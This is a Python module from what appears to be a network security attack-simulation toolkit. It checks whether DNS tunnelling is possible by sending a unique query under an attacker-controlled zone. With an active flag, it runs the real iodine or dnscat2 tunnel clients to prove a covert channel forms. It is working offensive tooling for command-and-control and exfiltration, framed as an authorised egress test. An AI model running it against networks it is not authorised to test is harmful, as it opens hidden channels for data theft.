"""Family B — classic DNS tunnelling to an attacker authoritative NS.

Encodes data in subdomain labels resolved via the recursive resolver to an
attacker-owned authoritative zone (iodine / dnscat2 / DNSExfiltrator). Works even
when only the internal resolver is reachable, because the internal resolver does
the recursion out to your NS.

  * INDICATOR (default): fire a uniquely-labelled query under your zone
    (canary_dns_zone / attacker_domain) at the configured resolver (external_resolver,
    default 8.8.8.8; set it to the internal/forced resolver to test that path). If it
    egresses (your authoritative NS / logs would see it), the precondition holds.
  * ACTIVE (--active): run a real tunnel client (iodine / dnscat2) against your NS
    for a few seconds and confirm the tunnel comes up, then tear it down. Needs the
    matching server on your authoritative NS.

Config: canary_dns_zone (falls back to attacker_domain). MITRE T1071.004 / T1048.001.
"""
import uuid
from modules import _util as U

META = {
    "id": "dns_tunnel",
    "name": "DNS Tunnelling (iodine/dnscat2)",
    "category": "Network Exploitation",
    "test_type": "attack_sim",
    "family": "B",
    "direction": "a2b",
    "added": True,
    "active": True,
    "control": "Restrict/monitor recursive DNS; block new authoritative zones",
    "fix": "SD-WAN",
    "mitre": ["T1071.004", "T1048.001"],
    "tactic": "Command and Control",
    "cwe": ["CWE-693"],
    "requires": [],
    "ports": [],
    "success_regex": r"^DNSTUN-|^CHANNEL-OPEN ",
    "blocked_regex": r"DNS tunnel precondition blocked",
}

_TUNNELS = {
    "iodine": (["iodine", "-f", "-r", "{zone}"], ["Connection setup complete", "Server tunnel IP"]),
    "dnscat2": (["dnscat2", "{zone}"], ["Session established", "established"]),
}


def run(target, ctx):
    zone = ctx.cfg("canary_dns_zone") or ctx.cfg("attacker_domain")
    out = ["# DNS tunnelling test (Family B)"]
    if not zone:
        out.append(U.skip("canary_dns_zone / attacker_domain not configured — need a "
                          "zone you are authoritative for to test DNS tunnelling."))
        return "\n".join(out)

    # ---- indicator: does a unique label under your zone egress? ---------------
    label = f"t{uuid.uuid4().hex[:16]}.{zone}"
    # query goes to the CONFIGURED resolver (external_resolver, default 8.8.8.8). To
    # test the realistic "internal resolver recurses out to your NS" path, point
    # external_resolver at the internal/forced resolver IP in config.json.
    resolver = ctx.cfg("external_resolver", "8.8.8.8")
    egressed, detail = U.dns_query(label, resolver, ctx, timeout=4)
    out.append(f"unique label {label} via resolver {resolver} — {detail}")
    if egressed:
        out.append(f"CHANNEL-OPEN DNS — a query under your zone {zone} egressed; the "
                   "recursive path to your authoritative NS is open (DNS-tunnel "
                   "precondition met). [FINDING]")
    else:
        out.append(f"DNS tunnel precondition blocked — query under {zone} did not egress")
        if not ctx.allow_active:
            return "\n".join(out)

    if not ctx.allow_active:
        out.append(U.skip("--active not set — not establishing a live DNS tunnel."))
        return "\n".join(out)

    # ---- active: run a real DNS-tunnel client briefly -------------------------
    tool = next((t for t in _TUNNELS if U.have(t)), None)
    if not tool:
        out.append("[ERROR] --active set but no DNS-tunnel client found (install iodine or dnscat2)")
        return "\n".join(out)
    argv, keys = _TUNNELS[tool]
    argv = [a.replace("{zone}", zone) for a in argv]
    out.append(f"[ACTIVE] launching {tool} against {zone} for up to 15s "
               "(needs the matching server on your authoritative NS)…")
    log, matched = U.run_transient(argv, seconds=15, look_for=keys)
    out.append(log)
    if matched:
        out.append(f"DNSTUN-ESTABLISHED via {tool} to {zone} — a full DNS tunnel formed "
                   "through the recursive resolver (torn down). Impact proof.")
    else:
        out.append(f"[SKIP] {tool} did not confirm a tunnel in the window — check the "
                   "NS-side server; the egress precondition result above still stands.")
    return "\n".join(out)
